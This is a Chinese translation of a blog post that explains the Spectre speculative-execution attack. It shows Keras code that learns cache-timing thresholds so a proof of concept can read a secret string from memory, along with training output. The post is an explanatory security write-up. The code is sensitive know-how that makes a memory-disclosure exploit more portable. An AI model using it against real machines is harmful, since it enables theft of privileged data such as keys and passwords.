# 利用深度学习开发 Spectre

> 原文：<https://medium.com/hackernoon/exploiting-spectre-with-deep-learning-d8ec2ba4c8ca>

![](img/a8f8671a57ce7350ddf3f0e33a27eacb.png)

上周，谷歌的 Project Zero 向安全社区抛出了一个[的重磅炸弹](https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html)，详细描述了影响[英特尔](https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf)、 [AMD](https://www.amd.com/en/corporate/speculative-execution) 和 [ARM](https://developer.arm.com/support/security-update) 架构的 CPU 缺陷，这些架构可以追溯到奔腾 pro。是的，芯片有一座山的缓存和不死的怪异铝。

这些 bug 实际上有几个变种，统称为 [Meltdown](https://meltdownattack.com/) 和 [Spectre](https://spectreattack.com/) ，在[官方 bug 报告](https://bugs.chromium.org/p/project-zero/issues/detail?id=1272)中有详细描述。有趣的是，错误总结的最后一行写道:

> 所有 POC 都是针对特定处理器编写的，可能至少需要一些调整才能在其他环境中运行，例如，由于硬编码的计时阈值[原文如此]。

事实上，硬编码值从来都不是一个好主意，因为它经常导致代码不灵活。这篇文章探讨了我们如何在深度学习的帮助下学习这些阈值。但首先，让我们回顾一下 Spectre 是如何工作的。

# spectre——或者如何利用 CPU 优化

如果你在寻找这个巧妙利用的完整解释，你可以在这里找到论文[。总之，Spectre 利用了两个非常流行的 CPU 优化:](https://spectreattack.com/spectre.pdf)[分支预测](https://en.wikipedia.org/wiki/Branch_predictor)和[推测执行](https://en.wikipedia.org/wiki/Speculative_execution)。当 CPU 执行包含附加到内存值的分支的一段代码时，由于从 RAM 中检索该值可能需要一些时间，因此 CPU 可以选择越过该分支执行。在高级编程语言中，分支通常是条件语句的结果，比如`if … then …`。当 RAM 中的值最终到达时，如果它的预测碰巧是错误的，CPU 将丢弃执行的代码。

这种推测性执行的副作用是将 CPU 读取的 RAM 复制到缓存中，如果该内存属于另一个进程，或者更糟的是，属于内核，那么在现代安全系统意识到内存访问被禁止之前，它将被缓存。因此，恶意代码可以欺骗 CPU 缓存特权内存，然后通过[侧通道](https://en.wikipedia.org/wiki/Side-channel_attack) [定时攻击](https://en.wikipedia.org/wiki/Timing_attack)读出缓存的值。这种攻击利用了 CPU 从 RAM(慢速)和片上 CPU 缓存(快速)获取值所需时间的差异。正如 bug 总结中提到的，每个 CPU 都会表现出不同的计时行为。这就是深度学习的用武之地。

# 深度学习 CPU 缓存计时

为了读取特权内存地址的字节值，我们的[概念验证代码](https://github.com/asm/deep_spectre/blob/master/deep_spectre.c#L81-L89)试图读取给定内存地址的每个可能的 8 位值——总共 256 个。我们不能直接读取值，因为内核不允许，但是我们可以观察每次读取花费了多长时间。如果读得很快，我们就有机会找到正确的值。不幸的是，这并不总是正确的，因为有些值读取起来总是有点快(例如，0 和 1)，所以假设最快可能会导致误读值。让我们看看如何使用深度学习模型来提高阅读准确性。

概念代码的完整证明可以在[这里](https://github.com/asm/deep_spectre)找到，从这里开始我将只包括最相关的部分。首先，我们将使用一串可能的字节值及其观察到的缓存计时来构建我们的训练数据:

```
data_x = np.zeros([n_samples, 256])
data_y = np.zeros([n_samples, len(unique_chars)])
for i in range(n_iterations):
    for j, val in enumerate(secret_chars):
        data_x[i * n_chars + j, :] = deep_spectre.train(j)
        data_y[i * n_chars + j, char_to_idx_map[val]] = 1
```

`data_x`包含我们的训练数据，`data_y`包含我们的目标数据。`data_x`的每一行代表对单个字节值的所有 256 个缓存读取时间的观察。`data_y`的每一行包含字节值，[一个热编码](https://en.wikipedia.org/wiki/One-hot)。神经网络通常对大值敏感，因此我们将使用 [Scikit Learn 的](http://scikit-learn.org/stable/)便捷缩放器来归一化(0 均值，单位方差)时序。我们还将把训练和目标数据分成训练集和验证集。验证集包含模型在训练时从未见过的数据，并提供了模型在野外表现如何的合理度量:

```
scaler = StandardScaler()
data_x = scaler.fit_transform(data_x)
x_train, x_test, y_train, y_test = train_test_split(data_x, data_y)
```

现在是激动人心的部分——让我们建立一个简单的深度模型。我们将使用 [Keras API](https://keras.io/) 来包装 [TensorFlow](https://www.tensorflow.org/) 并构建一个四层密集连接的神经网络。如果你对神经架构感兴趣，我鼓励你去看看 Keras 提供的其他层类型。

```
model = Sequential()
model.add(Dense(200, input_shape = (256,), activation = ‘relu’))
model.add(Dense(150, activation = ‘relu’))
model.add(Dense(100, activation = ‘relu’))
model.add(Dense(len(unique_chars), activation = ‘softmax’))model.compile(loss = ‘categorical_crossentropy’,
              optimizer = ‘adam’,
              metrics = [‘accuracy’])model.fit(x_train, y_train, 
          batch_size = 32,
          epochs = 10,
          validation_data = (x_test, y_test))
```

呼叫`model.fit()`将开始训练过程。如果一切顺利，我们的模型应该达到 90%以上的准确率。在我的机器上运行这个程序会产生:

```
Train on 48000 samples, validate on 16000 samples
Epoch 1/10
48000/48000 [==============================] — 4s 83us/step — loss: 2.9168 — acc: 0.3363 — val_loss: 0.7985 — val_acc: 0.8276
Epoch 2/10
48000/48000 [==============================] — 4s 73us/step — loss: 0.4543 — acc: 0.9007 — val_loss: 0.3505 — val_acc: 0.9204
Epoch 3/10
48000/48000 [==============================] — 4s 75us/step — loss: 0.2802 — acc: 0.9367 — val_loss: 0.2825 — val_acc: 0.9335
Epoch 4/10
48000/48000 [==============================] — 3s 73us/step — loss: 0.2516 — acc: 0.9441 — val_loss: 0.2948 — val_acc: 0.9293
Epoch 5/10
48000/48000 [==============================] — 4s 73us/step — loss: 0.2368 — acc: 0.9451 — val_loss: 0.2640 — val_acc: 0.9361
Epoch 6/10
48000/48000 [==============================] — 4s 73us/step — loss: 0.2320 — acc: 0.9460 — val_loss: 0.2765 — val_acc: 0.9360
Epoch 7/10
48000/48000 [==============================] — 3s 73us/step — loss: 0.2405 — acc: 0.9458 — val_loss: 0.2588 — val_acc: 0.9376
Epoch 8/10
48000/48000 [==============================] — 4s 74us/step — loss: 0.2324 — acc: 0.9468 — val_loss: 0.2502 — val_acc: 0.9403
Epoch 9/10
48000/48000 [==============================] — 4s 73us/step — loss: 0.2269 — acc: 0.9474 — val_loss: 0.2452 — val_acc: 0.9408
Epoch 10/10
48000/48000 [==============================] — 3s 72us/step — loss: 0.2277 — acc: 0.9467 — val_loss: 0.2663 — val_acc: 0.9392
```

现在我们有了一个训练好的模型，我们可以用它来预测未知的字节值，只给定缓存计时。例如，让我们读取一个 40 字节的秘密字符串:

```
secret_len = 40
x_message = np.zeros([secret_len, 256])
for i in range(secret_len):
    x_message[i, :] = deep_spectre.read(i)
```

在将`x_message`传递到`model.predict()`之后，我们简单地通过`np.argmax()`获取概率最高的输出神经元，并将其映射回一个字节值:

```
y_pred = model.predict(scaler.transform(x_message))
pred_chars = np.argmax(y_pred, axis=1)
message = ‘’.join(list(map(lambda x: chr(idx_to_char_map[x]), pred_chars)))
print(“The secret message is:”, message)
```

如果一切按计划进行，我们应该看到:

```
The secret message is: The Magic Words are Squeamish Ossifrage.
```

将这些深度学习框架与漏洞打包在一起将会产生非常大的有效载荷。然而，可以使用 [TensorFlow Lite](https://www.tensorflow.org/mobile/tflite/) 来减小模型的尺寸。毫无疑问，不难想象一种新的神经利用技术，用深度学习模型来克服跨 CPU 架构和软件版本的特质。

当然，这仍然是纯粹的推测；)